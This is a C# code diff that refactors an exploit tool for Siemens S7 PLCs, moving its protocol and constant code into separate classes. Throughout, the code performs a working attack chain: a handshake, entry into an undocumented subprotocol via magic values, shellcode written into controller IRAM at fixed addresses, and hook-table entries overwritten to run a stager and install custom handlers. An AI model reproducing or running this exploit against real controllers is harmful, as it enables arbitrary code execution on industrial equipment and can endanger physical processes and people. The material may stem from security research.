@@ -7,31 +7,15 @@ using System.Text;
 using System.Diagnostics;
 using System.Threading;
 
-namespace S7_Csharp_Utility
+namespace S7.Net
 {
-    public class PlcCommunicator
+    public class PlcClient
     {
         private TcpClient _client;
-        private NetworkStream _stream;
+        private PlcProtocol _protocol;
         private readonly Action<string> _log;
 
-        #region Constants
-        private const int MAX_MSG_LEN = 192 - 2;
-
-        // Addresses ported from client.py
-        private const uint IRAM_STAGER_START = 0x10030100;
-        private const uint ADD_HOOK_TABLE_START = 0x1003ABA0;
-        private const int DEFAULT_STAGER_ADDHOOK_IND = 0x20;
-        private const int DEFAULT_SECOND_ADD_HOOK_IND = 0x1a;
-        private const uint NEXT_PAYLOAD_LOCATION = 0x10010100;
-
-        // Protocol constants
-        private static readonly byte[] ANSW_ENTER_SUBPROTO_SUCCESS = { 0x80, 0x00 };
-        private static readonly ushort[] SUBPROT_80_MODE_MAGICS = { 0, 0x3BC2, 0x9d26, 0xe17a, 0xc54f };
-        private const int SUBPROT_80_MODE_IRAM = 1;
-        #endregion
-
-        public PlcCommunicator(Action<string> logger)
+        public PlcClient(Action<string> logger)
         {
             _log = logger;
         }
@@ -47,7 +31,8 @@ namespace S7_Csharp_Utility
             try
             {
                 await _client.ConnectAsync(host, port);
-                _stream = _client.GetStream();
+                var stream = _client.GetStream();
+                _protocol = new PlcProtocol(stream, _log);
                 _log("Successfully connected to PLC proxy.");
             }
             catch (Exception ex)
@@ -59,77 +44,9 @@ namespace S7_Csharp_Utility
 
         public void Disconnect()
         {
-            _stream?.Close();
             _client?.Close();
             _client = null;
             _log("Disconnected from PLC proxy.");
-        }
-
-        #region Core Protocol
-        private byte CalculateChecksum(byte[] packetData, int offset, int length)
-        {
-            int sum = 0;
-            for (int i = 0; i < length; i++)
-            {
-                sum += packetData[offset + i];
-            }
-            return (byte)-sum;
-        }
-
-        public async Task SendPacketAsync(byte[] contents, int step = 2, int sleepMs = 10)
-        {
-            if (contents.Length > MAX_MSG_LEN)
-                throw new ArgumentException($"Message too long. Max length is {MAX_MSG_LEN} bytes.");
-
-            var packet = new byte[contents.Length + 2];
-            packet[0] = (byte)(contents.Length + 1);
-            Array.Copy(contents, 0, packet, 1, contents.Length);
-            packet[packet.Length - 1] = CalculateChecksum(packet, 0, packet.Length - 1);
-
-            _log($"-> SEND: {BitConverter.ToString(packet).Replace("-", "")}");
-
-            for (int i = 0; i < packet.Length; i += step)
-            {
-                int bytesToSend = Math.Min(step, packet.Length - i);
-                await _stream.WriteAsync(packet, i, bytesToSend);
-                if (sleepMs > 0) await Task.Delay(sleepMs);
-            }
-        }
-
-        public async Task<byte[]> ReceivePacketAsync(int timeoutMs = 2000)
-        {
-            var cancellationTokenSource = new CancellationTokenSource(timeoutMs);
-            var token = cancellationTokenSource.Token;
-
-            var lengthByte = new byte[1];
-            await _stream.ReadAsync(lengthByte, 0, 1, token);
-            int bytesToRead = lengthByte[0];
-
-            if (bytesToRead == 0) return Array.Empty<byte>();
-
-            var fullPacket = new byte[bytesToRead + 1];
-            fullPacket[0] = lengthByte[0];
-
-            int bytesRead = 0;
-            while(bytesRead < bytesToRead)
-            {
-                bytesRead += await _stream.ReadAsync(fullPacket, 1 + bytesRead, bytesToRead - bytesRead, token);
-            }
-
-            _log($"<- RECV: {BitConverter.ToString(fullPacket).Replace("-", "")}");
-
-            byte receivedChecksum = fullPacket.Last();
-            byte calculatedChecksum = CalculateChecksum(fullPacket, 0, fullPacket.Length - 1);
-
-            if (receivedChecksum != calculatedChecksum)
-            {
-                _log("CHECKSUM ERROR!");
-                return null;
-            }
-
-            var contents = new byte[bytesToRead - 1];
-            Array.Copy(fullPacket, 1, contents, 0, contents.Length);
-            return contents;
         }
 
         public async Task<byte[]> InvokePrimaryHandler(byte handlerIndex, byte[] args, bool awaitResponse = true)
@@ -137,10 +54,9 @@ namespace S7_Csharp_Utility
             var payload = new byte[1 + args.Length];
             payload[0] = handlerIndex;
             Array.Copy(args, 0, payload, 1, args.Length);
-            await SendPacketAsync(payload);
-            return awaitResponse ? await ReceivePacketAsync() : null;
+            await _protocol.SendPacketAsync(payload);
+            return awaitResponse ? await _protocol.ReceivePacketAsync() : null;
         }
-        #endregion
 
         #region Stager/Exploit Chain
         public async Task<bool> PerformHandshakeAsync()
@@ -153,12 +69,12 @@ namespace S7_Csharp_Utility
             var sw = Stopwatch.StartNew();
             while (sw.ElapsedMilliseconds < 500) // Try for 0.5 seconds
             {
-                await _stream.WriteAsync(handshakePayload, 0, handshakePayload.Length);
+                await _protocol.RawWriteAsync(handshakePayload, 0, handshakePayload.Length);
                 await Task.Delay(50);
-                if (_stream.DataAvailable)
+                if (_protocol.DataAvailable)
                 {
                     var buffer = new byte[256];
-                    int bytesRead = await _stream.ReadAsync(buffer, 0, buffer.Length);
+                    int bytesRead = await _protocol.RawReadAsync(buffer, 0, buffer.Length);
                     // Expected response is \x05-CPU
                     if (bytesRead >= 5 && buffer[0] == 5 && Encoding.ASCII.GetString(buffer, 1, 4) == "-CPU")
                     {
@@ -183,11 +99,11 @@ namespace S7_Csharp_Utility
         private async Task EnterSubprotocol(int mode)
         {
             _log($"Entering subprotocol mode {mode}...");
-            ushort magic = SUBPROT_80_MODE_MAGICS[mode];
+            ushort magic = PlcConstants.SUBPROT_80_MODE_MAGICS[mode];
             byte[] payload = BitConverter.GetBytes(magic);
             if (BitConverter.IsLittleEndian) Array.Reverse(payload); // Make big-endian
             var response = await InvokePrimaryHandler(0x80, payload);
-            if (!response.SequenceEqual(ANSW_ENTER_SUBPROTO_SUCCESS))
+            if (!response.SequenceEqual(PlcConstants.ANSW_ENTER_SUBPROTO_SUCCESS))
                 throw new Exception("Failed to enter subprotocol.");
             _log("Entered subprotocol successfully.");
         }
@@ -195,8 +111,8 @@ namespace S7_Csharp_Utility
         private async Task LeaveSubprotocol()
         {
             _log("Leaving subprotocol...");
-            await SendPacketAsync(new byte[] { 0x81, 0xD0, 0x67 });
-            await ReceivePacketAsync();
+            await _protocol.SendPacketAsync(new byte[] { 0x81, 0xD0, 0x67 });
+            await _protocol.ReceivePacketAsync();
         }
 
         private async Task RawSubprotocolWrite(uint address, byte[] data)
@@ -210,8 +126,8 @@ namespace S7_Csharp_Utility
             Array.Copy(addrBytes, 0, payload, 3, 4);
             Array.Copy(data, 0, payload, 7, data.Length);
 
-            await SendPacketAsync(payload);
-            await ReceivePacketAsync();
+            await _protocol.SendPacketAsync(payload);
+            await _protocol.ReceivePacketAsync();
         }
 
         private async Task WriteChunkToIram(uint targetAddress, byte[] contents)
@@ -226,7 +142,7 @@ namespace S7_Csharp_Utility
         public async Task WriteToIram(uint targetAddress, byte[] contents)
         {
             _log($"Writing {contents.Length} bytes to IRAM at 0x{targetAddress:X8}");
-            await EnterSubprotocol(SUBPROT_80_MODE_IRAM);
+            await EnterSubprotocol(PlcConstants.SUBPROT_80_MODE_IRAM);
 
             int chunkSize = 16; // From python script
             for (int i = 0; i < contents.Length; i += chunkSize)
@@ -246,7 +162,7 @@ namespace S7_Csharp_Utility
         {
             _log("Starting stager installation...");
             // 1. Write stager shellcode to its location in IRAM
-            await WriteToIram(IRAM_STAGER_START, stagerPayload);
+            await WriteToIram(PlcConstants.IRAM_STAGER_START, stagerPayload);
 
             // 2. Overwrite an entry in the hook table to point to our stager
             _log("Overwriting hook table entry...");
@@ -255,11 +171,11 @@ namespace S7_Csharp_Utility
             hookEntryPayload[1] = 0xFF; // Arg length check part 2 (0x00FF = variable length)
 
             // Pointer to the stager code (big-endian)
-            var addrBytes = BitConverter.GetBytes(IRAM_STAGER_START);
+            var addrBytes = BitConverter.GetBytes(PlcConstants.IRAM_STAGER_START);
             if (BitConverter.IsLittleEndian) Array.Reverse(addrBytes);
             Array.Copy(addrBytes, 0, hookEntryPayload, 2, 4);
 
-            await WriteToIram(ADD_HOOK_TABLE_START + 8 * DEFAULT_STAGER_ADDHOOK_IND + 2, hookEntryPayload);
+            await WriteToIram(PlcConstants.ADD_HOOK_TABLE_START + 8 * PlcConstants.DEFAULT_STAGER_ADDHOOK_IND + 2, hookEntryPayload);
             _log("Stager installation complete.");
         }
         #endregion
@@ -288,7 +204,7 @@ namespace S7_Csharp_Utility
 
         public async Task SendFullMsgViaStager(byte[] msg)
         {
-            int maxChunkSize = MAX_MSG_LEN - 1;
+            int maxChunkSize = PlcConstants.MAX_MSG_LEN - 1;
             for (int i = 0; i < msg.Length; i += maxChunkSize)
             {
                 int size = Math.Min(maxChunkSize, msg.Length - i);
@@ -298,17 +214,17 @@ namespace S7_Csharp_Utility
                 _log($"Stager send progress: {i}/{msg.Length}");
 
                 var encoded = EncodePacketForStager(chunk);
-                await SendPacketAsync(encoded, 8, 10);
+                await _protocol.SendPacketAsync(encoded, 8, 10);
 
-                var ack = await ReceivePacketAsync();
+                var ack = await _protocol.ReceivePacketAsync();
                 if (ack == null || ack.Length != 1)
                 {
                     throw new Exception("Did not receive expected empty ACK from stager.");
                 }
             }
             // Send empty packet to signify end of transmission
-            await SendPacketAsync(EncodePacketForStager(Array.Empty<byte>()));
-            await ReceivePacketAsync();
+            await _protocol.SendPacketAsync(EncodePacketForStager(Array.Empty<byte>()));
+            await _protocol.ReceivePacketAsync();
         }
 
         public async Task<byte[]> InvokeAddHook(int hookNo, byte[] args, bool awaitResponse = true)
@@ -332,7 +248,7 @@ namespace S7_Csharp_Utility
                 (byte)(address >> 8),
                 (byte)address
             };
-            await InvokeAddHook(DEFAULT_STAGER_ADDHOOK_IND, addressBytes, false);
+            await InvokeAddHook(PlcConstants.DEFAULT_STAGER_ADDHOOK_IND, addressBytes, false);
             await SendFullMsgViaStager(contents);
         }
 
@@ -345,7 +261,7 @@ namespace S7_Csharp_Utility
             hookEntry[5] = (byte)(targetAddress >> 16);
             hookEntry[6] = (byte)(targetAddress >> 8);
             hookEntry[7] = (byte)targetAddress;
-            await WriteViaStager(ADD_HOOK_TABLE_START + (uint)(8 * newHookNo), hookEntry);
+            await WriteViaStager(PlcConstants.ADD_HOOK_TABLE_START + (uint)(8 * newHookNo), hookEntry);
 
             // Write the code of the handler itself
             await WriteViaStager(targetAddress, payload);
@@ -357,7 +273,7 @@ namespace S7_Csharp_Utility
             {
                 while (true)
                 {
-                    var chunk = await ReceivePacketAsync(timeoutMs);
+                    var chunk = await _protocol.ReceivePacketAsync(timeoutMs);
                     if (chunk == null || chunk.Length == 0)
                     {
                         break;
